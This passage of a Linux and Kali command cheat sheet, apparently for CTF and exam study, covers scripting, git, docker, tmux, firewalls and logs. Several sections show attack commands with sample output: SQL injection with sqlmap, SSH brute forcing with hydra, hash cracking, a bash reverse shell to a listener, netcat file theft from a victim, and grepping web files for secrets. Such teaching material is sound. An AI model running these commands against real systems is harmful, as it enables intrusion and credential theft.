# ── CRON SYNTAX REFERENCE ────────────────────────────────────────
#
#  ┌───────────── minute       (0-59)
#  │ ┌─────────── hour         (0-23)
#  │ │ ┌───────── day of month (1-31)
#  │ │ │ ┌─────── month        (1-12)
#  │ │ │ │ ┌───── day of week  (0-7, Sun=0)
#  │ │ │ │ │
#  * * * * *   command
#
#  */5 * * * *   → every 5 minutes
#  0 2 * * *     → daily at 2:00 AM
#  0 9 * * 1     → every Monday 9 AM
#  @reboot       → once at system startup
#  @daily        → same as  0 0 * * *
#  @hourly       → same as  0 * * * *
```

---

## 17 · Bash Scripting

```bash
#!/bin/bash
# ── recon.sh — Automated target recon ─────────────────────────

TARGET=$1
OUTDIR="./recon_$(date +%Y%m%d_%H%M%S)"

# ── Input validation ──────────────────────────────────────────
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

mkdir -p "$OUTDIR"
echo "[*] Starting recon on: $TARGET"
echo "[*] Output directory: $OUTDIR"

# ── Port scan ─────────────────────────────────────────────────
echo "[*] Running port scan..."
nmap -sV -oN "$OUTDIR/nmap.txt" "$TARGET"

OPEN_PORTS=$(grep "open" "$OUTDIR/nmap.txt" | wc -l)
echo "[+] Found $OPEN_PORTS open ports"

# ── Service checks ────────────────────────────────────────────
if grep -q "80/tcp" "$OUTDIR/nmap.txt"; then
    echo "[*] HTTP detected — running gobuster..."
    gobuster dir -u "http://$TARGET" \
        -w /usr/share/wordlists/dirb/common.txt \
        -o "$OUTDIR/gobuster.txt" -q
fi

if grep -q "22/tcp" "$OUTDIR/nmap.txt"; then
    echo "[!] SSH is open on $TARGET"
fi

# ── Loop through IPs ──────────────────────────────────────────
for i in {1..254}; do
    IP="192.168.1.$i"
    ping -c 1 -W 1 "$IP" > /dev/null 2>&1 && echo "[+] Host up: $IP"
done

echo "[+] Recon complete. Results in: $OUTDIR"
```

```bash
# ── Running the script ───────────────────────────────────────

┌──(ayush㉿kali)-[~/scripts]
└─$ chmod +x recon.sh
└─$ ./recon.sh 192.168.1.1
[*] Starting recon on: 192.168.1.1
[*] Output directory: ./recon_20240517_092534
[*] Running port scan...
[+] Found 3 open ports
[*] HTTP detected — running gobuster...
[!] SSH is open on 192.168.1.1
[+] Recon complete. Results in: ./recon_20240517_092534
```

---

## 18 · Kali Linux Hacking Tools

```bash
# ── NMAP ────────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ nmap -sV -O 192.168.1.1
Starting Nmap 7.94
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9 (protocol 2.0)
80/tcp   open  http     Apache 2.4.52
443/tcp  open  ssl/http Apache 2.4.52
3306/tcp open  mysql    MySQL 8.0.32
OS details: Linux 4.15 - 5.8

┌──(ayush㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 192.168.1.1 -oN allports.txt
# Scans all 65535 ports rapidly

┌──(ayush㉿kali)-[~]
└─$ nmap --script vuln 192.168.1.1
PORT   STATE SERVICE
80/tcp open  http
| http-sql-injection:
|   Possible sqli for queries:
|     http://192.168.1.1:80/page?id=1'
| http-csrf:
|_  Couldn't find any CSRF vulnerabilities.

# ── GOBUSTER ────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
===============================================================
/admin                (Status: 301) [Size: 317]
/backup               (Status: 200) [Size: 1024]
/config               (Status: 403) [Size: 289]
/login                (Status: 200) [Size: 2048]
/uploads              (Status: 301) [Size: 320]
===============================================================

# ── SQLMAP ──────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ sqlmap -u "http://192.168.1.1/page?id=1" --dbs --batch
[*] starting @ 09:30:00
[09:30:01] [INFO] testing if GET parameter 'id' is dynamic... YES
[09:30:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based' injectable
[09:30:05] [INFO] fetching database names
available databases [3]:
[*] information_schema
[*] mysql
[*] webapp_db

# ── HYDRA ───────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50
Hydra v9.5 starting
[DATA] max 16 tasks per 1 server, 16 threads
[DATA] attacking ssh://192.168.1.50:22
[22][ssh] host: 192.168.1.50   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found

# ── HASHCAT ─────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
└─$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
5f4dcc3b5aa765d61d8327deb882cf99:password
Session..........: hashcat
Status...........: Cracked
Time.Started.....: Fri May 17 09:35 2024
Time.Estimated...: Fri May 17 09:35 2024 (0 secs)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 892.8 MH/s

# ── PRIVILEGE ESCALATION ─────────────────────────────────────────

┌──(ayush㉿victim)-[~]
└─$ sudo -l
Matching Defaults entries for ayush:
    env_reset, mail_badpass
User ayush may run the following commands on victim:
    (ALL) NOPASSWD: /usr/bin/python3

┌──(ayush㉿victim)-[~]
└─$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/sbin/pppd

┌──(ayush㉿victim)-[~]
└─$ uname -a
Linux victim 5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020 x86_64
# Check kernel version against known CVEs (e.g., CVE-2021-4034 PwnKit)
```

---

## 19 · Netcat & Socat

```bash
# ── LISTENER (attacker machine) ─────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

# ── TARGET executes reverse shell ───────────────────────────────
# bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# ── Connection received ──────────────────────────────────────────
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.50] 38942
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash-5.1$ whoami
www-data
bash-5.1$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash-5.1$ hostname
victim-server

# ── FILE TRANSFER VIA NETCAT ─────────────────────────────────────

# Receiver:
┌──(ayush㉿kali)-[~]
└─$ nc -lvnp 5555 > received_file.zip

# Sender:
┌──(victim)-[~]
└─$ nc 192.168.1.100 5555 < important_file.zip
# Fast, no encryption — use only on trusted networks

# ── PORT SCAN WITH NETCAT ────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ nc -z -v 192.168.1.1 20-25 80 443 2>&1 | grep "succeeded"
Connection to 192.168.1.1 22 port [tcp/ssh] succeeded!
Connection to 192.168.1.1 80 port [tcp/http] succeeded!
Connection to 192.168.1.1 443 port [tcp/https] succeeded!

# ── SOCAT ENCRYPTED SHELL ────────────────────────────────────────

# Listener:
┌──(ayush㉿kali)-[~]
└─$ socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr

# Connect:
┌──(ayush㉿kali)-[~]
└─$ socat TCP:192.168.1.50:4444 -,raw,echo=0
```

---

## 20 · Git Commands

```bash
┌──(ayush㉿kali)-[~/projects]
└─$ git init
Initialized empty Git repository in /home/ayush/projects/.git/

┌──(ayush㉿kali)-[~/projects]
└─$ git config --global user.name "Ayush"
└─$ git config --global user.email "ayush@example.com"

┌──(ayush㉿kali)-[~/projects]
└─$ git status
On branch main
Untracked files:
  (use "git add <file>..." to include in what will be committed)
        enum.sh
        recon.py
        notes.md

┌──(ayush㉿kali)-[~/projects]
└─$ git add .
└─$ git commit -m "Initial commit: add recon tools"
[main (root-commit) a1b2c3d] Initial commit: add recon tools
 3 files changed, 187 insertions(+)
 create mode 100755 enum.sh
 create mode 100644 recon.py
 create mode 100644 notes.md

┌──(ayush㉿kali)-[~/projects]
└─$ git log --oneline
a1b2c3d (HEAD -> main) Initial commit: add recon tools
9e8f7g6 Add gobuster wordlists
5d4e3f2 Fix SSH enumeration bug

┌──(ayush㉿kali)-[~/projects]
└─$ git checkout -b feature/web-scanner
Switched to a new branch 'feature/web-scanner'

┌──(ayush㉿kali)-[~/projects]
└─$ git diff
diff --git a/recon.py b/recon.py
index abc123..def456 100644
--- a/recon.py
+++ b/recon.py
@@ -10,6 +10,8 @@ def scan(target):
+    print("[*] Starting web directory scan...")
+    os.system(f"gobuster dir -u http://{target}")

┌──(ayush㉿kali)-[~/projects]
└─$ git stash
Saved working directory and index state WIP on main: a1b2c3d

┌──(ayush㉿kali)-[~/projects]
└─$ git stash pop
On branch main
Changes not staged for commit:
        modified:   recon.py
```

---

## 21 · Docker Commands

```bash
┌──(ayush㉿kali)-[~]
└─$ docker pull kalilinux/kali-rolling
kali-rolling: Pulling from kalilinux/kali-rolling
3f9582a2cbe7: Pull complete
Digest: sha256:abc123...
Status: Downloaded newer image for kalilinux/kali-rolling:latest

┌──(ayush㉿kali)-[~]
└─$ docker images
REPOSITORY                  TAG       IMAGE ID       CREATED       SIZE
kalilinux/kali-rolling      latest    a1b2c3d4e5f6   2 days ago    126MB
nginx                       latest    b2c3d4e5f6a1   1 week ago    192MB
mysql                       8.0       c3d4e5f6a1b2   2 weeks ago   596MB

┌──(ayush㉿kali)-[~]
└─$ docker run -it --rm kalilinux/kali-rolling bash
root@7f8a9b0c1d2e:/# apt update && apt install nmap -y
root@7f8a9b0c1d2e:/# nmap --version
Nmap version 7.94
root@7f8a9b0c1d2e:/# exit

┌──(ayush㉿kali)-[~]
└─$ docker run -d -p 8080:80 --name webserver nginx
3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d

┌──(ayush㉿kali)-[~]
└─$ docker ps
CONTAINER ID   IMAGE   COMMAND                  PORTS                  NAMES
3a4b5c6d7e8f   nginx   "/docker-entrypoint.…"   0.0.0.0:8080->80/tcp   webserver

┌──(ayush㉿kali)-[~]
└─$ docker exec -it webserver bash
root@3a4b5c6d7e8f:/# cat /etc/nginx/nginx.conf

┌──(ayush㉿kali)-[~]
└─$ docker logs webserver --tail 20
192.168.1.10 - - [17/May/2024:09:30:00 +0000] "GET / HTTP/1.1" 200 615
192.168.1.10 - - [17/May/2024:09:30:01 +0000] "GET /index.html" 200 615

┌──(ayush㉿kali)-[~]
└─$ docker stop webserver && docker rm webserver
webserver
webserver
```

---

## 22 · Tmux & Screen

```bash
┌──(ayush㉿kali)-[~]
└─$ tmux new -s pentest
# Creates named session "pentest"

# Inside tmux — split for multi-pane workflow:
# ┌──────────────────┬──────────────────┐
# │                  │                  │
# │  Ctrl+b %        │  nmap scan       │
# │  (split vert)    │  running here    │
# │                  │                  │
# ├──────────────────┴──────────────────┤
# │  Ctrl+b "  (split horiz)            │
# │  nc listener / logs here            │
# └─────────────────────────────────────┘

┌──(ayush㉿kali)-[~]
└─$ tmux ls
pentest: 1 windows (created Fri May 17 09:00:00 2024)
ctf: 2 windows (created Thu May 16 20:00:00 2024)

┌──(ayush㉿kali)-[~]
└─$ tmux attach -t pentest
# Re-attaches to running session — all processes still alive

# ── TMUX SHORTCUT REFERENCE ─────────────────────────────────────
#
#  PREFIX = Ctrl+b
#  ──────────────────────────────────────────────────────────────
#  PREFIX c        → new window
#  PREFIX n / p    → next / previous window
#  PREFIX ,        → rename current window
#  PREFIX %        → split vertically (side by side)
#  PREFIX "        → split horizontally (top/bottom)
#  PREFIX ↑↓←→     → navigate between panes
#  PREFIX d        → detach session (keeps running)
#  PREFIX [        → enter scroll/copy mode (q to exit)
#  PREFIX z        → zoom current pane (toggle fullscreen)
#  PREFIX &        → kill current window (confirm with y)
```

---

## 23 · Firewall & iptables

```bash
# ── UFW ─────────────────────────────────────────────────────────

┌──(root㉿kali)-[~]
└─# ufw status verbose
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), disabled (routed)

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    Anywhere
80/tcp                     ALLOW IN    Anywhere
443/tcp                    ALLOW IN    Anywhere
22/tcp (v6)                ALLOW IN    Anywhere (v6)

┌──(root㉿kali)-[~]
└─# ufw allow from 192.168.1.0/24 to any port 22
Rule added

┌──(root㉿kali)-[~]
└─# ufw deny 23
Rule added

# ── IPTABLES ────────────────────────────────────────────────────

┌──(root㉿kali)-[~]
└─# iptables -L -n -v
Chain INPUT (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot  opt  in  out  source       destination
  245  18K  ACCEPT     all   --   lo  *    0.0.0.0/0    0.0.0.0/0
 1024  86K  ACCEPT     tcp   --   *   *    0.0.0.0/0    0.0.0.0/0    tcp dpt:22
  512  42K  ACCEPT     tcp   --   *   *    0.0.0.0/0    0.0.0.0/0    tcp dpt:80

┌──(root㉿kali)-[~]
└─# iptables -A INPUT -p tcp --dport 4444 -j DROP
# Blocks incoming connections on port 4444

┌──(root㉿kali)-[~]
└─# iptables-save > /etc/iptables/rules.v4
# Persists rules across reboots
```

---

## 24 · Log Analysis

```bash
┌──(root㉿kali)-[~]
└─# tail -f /var/log/auth.log
May 17 09:40:01 kali sshd[3421]: Failed password for root from 10.0.0.5 port 58234 ssh2
May 17 09:40:02 kali sshd[3422]: Failed password for root from 10.0.0.5 port 58235 ssh2
May 17 09:40:03 kali sshd[3423]: Failed password for admin from 10.0.0.5 port 58236 ssh2
# ⚠ Signs of SSH brute force from 10.0.0.5

┌──(root㉿kali)-[~]
└─# grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
    523 10.0.0.5
     87 203.45.67.89
     12 192.168.1.200
# Who is attacking — top IPs by failed attempts

┌──(root㉿kali)-[~]
└─# grep "Accepted" /var/log/auth.log
May 17 09:20:31 kali sshd[2341]: Accepted publickey for ayush from 192.168.1.10
# Successful logins

┌──(root㉿kali)-[~]
└─# lastb | head -10
root     ssh:notty    10.0.0.5         Fri May 17 09:40 - 09:40 (00:00)
admin    ssh:notty    10.0.0.5         Fri May 17 09:40 - 09:40 (00:00)
root     ssh:notty    10.0.0.5         Fri May 17 09:39 - 09:39 (00:00)
# Failed login attempts history

┌──(ayush㉿kali)-[~]
└─$ journalctl -u ssh --since "30 minutes ago"
May 17 09:20:31 kali sshd[2341]: Server listening on 0.0.0.0 port 22.
May 17 09:30:01 kali sshd[3100]: Connection from 10.0.0.5 port 58234
May 17 09:40:01 kali sshd[3421]: Failed password for root from 10.0.0.5

┌──(ayush㉿kali)-[~]
└─$ tail -f /var/log/nginx/access.log | grep -v "200"
192.168.1.50 - - [17/May/2024:09:45:01] "GET /admin HTTP/1.1" 403 289
192.168.1.50 - - [17/May/2024:09:45:02] "GET /wp-admin HTTP/1.1" 404 152
192.168.1.50 - - [17/May/2024:09:45:03] "GET /.env HTTP/1.1" 404 152
# Watching for non-200 responses (scans, probes)
```

---

## 25 · One-Liners & Power Tricks

```bash
# ── SYSTEM ──────────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ sudo !!
# Re-runs previous command with sudo — lifesaver

┌──(ayush㉿kali)-[~]
└─$ mkdir -p ~/ctf/2024/web && cd $_
# Creates nested dirs and cd's directly into the last one

┌──(ayush㉿kali)-[~]
└─$ du -sh * | sort -rh | head -10
256M    Downloads
120M    projects
 48M    Documents
 12M    .cache

# ── FILE TRICKS ─────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ cp important.conf{,.bak}
# Creates important.conf.bak — fastest backup trick

┌──(ayush㉿kali)-[~]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
# Instant file server in current directory

┌──(ayush㉿kali)-[~]
└─$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32
k8mN3pQ7vR2wX5tL9bG4eD1hJ6cF0yZ8

# ── HACKING ONE-LINERS ──────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ find / -perm -4000 2>/dev/null | xargs ls -la
-rwsr-xr-x 1 root root 88304 Feb  1 2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59976 Feb  1 2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Feb  1 2024 /usr/bin/sudo
# All SUID binaries — check gtfobins.github.io for exploits

┌──(ayush㉿kali)-[~]
└─$ awk -F: '($3==0)' /etc/passwd
root:x:0:0:root:/root:/bin/bash
# Find all root-equivalent users (UID 0)

┌──(ayush㉿kali)-[~]
└─$ grep -r "password\|passwd\|secret\|api_key\|token" /var/www/ 2>/dev/null
/var/www/html/config.php:$db_password = "superSecret123!";
/var/www/html/.env:API_KEY=sk-abc123xyz789

┌──(ayush㉿kali)-[~]
└─$ history | awk '{print $2}' | sort | uniq -c | sort -rn | head
     89 git
     67 nmap
     54 python3
     48 ssh
     41 sudo
# Your most-used commands

# ── FORENSICS ───────────────────────────────────────────────────

┌──(ayush㉿kali)-[~]
└─$ sha256sum suspicious.exe
3b4c9d8e7f1a2b5c6d9e0f3a4b7c8d1e2f5a6b9c0d3e4f7a8b1c2d5e6f9a0b  suspicious.exe

┌──(ayush㉿kali)-[~]
└─$ strings malware.bin | grep -E "http|192\.|password|cmd" | head -20
http://c2server.evil.com/beacon
192.168.1.1
cmd.exe /c whoami

┌──(ayush㉿kali)-[~]
└─$ xxd unknown.bin | head -5
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 5010 4000 0000 0000  ..>.....P.@.....
# 7f 45 4c 46 = ELF magic bytes → Linux executable confirmed

┌──(ayush㉿kali)-[~]
└─$ curl -s https://ipinfo.io/json
{
  "ip": "203.45.67.89",
  "city": "Mumbai",
  "region": "Maharashtra",
  "country": "IN",
  "org": "AS55836 Reliance Jio"
}
```

---

<div align="center">

```
╔══════════════════════════════════════════════════════════════╗
║              Q U I C K   R E F E R E N C E                  ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  ✦  Navigation & Files      ✦  Permissions & Users          ║
║  ✦  Processes & Services    ✦  Networking & SSH             ║
║  ✦  Package Management      ✦  Disk & Compression           ║
║  ✦  Search & Filter         ✦  Bash Scripting               ║
║  ✦  Kali Hacking Tools      ✦  Netcat & Shells              ║
║  ✦  Git & Docker            ✦  Tmux & Screen                ║
║  ✦  Firewall & iptables     ✦  Log Analysis                 ║
║  ✦  One-Liners & Tricks     ✦  Forensics                    ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
```

> *"The command line is not just a tool — it is a language."*
> *"Master the terminal. Master the system."*
> *"grep harder. find faster. hack smarter."*

**Made with precision for GATE 2027 & CTF warriors**

</div>

---

*All commands shown for educational and authorized testing purposes only.*
*Always obtain permission before scanning or testing any system you do not own.*
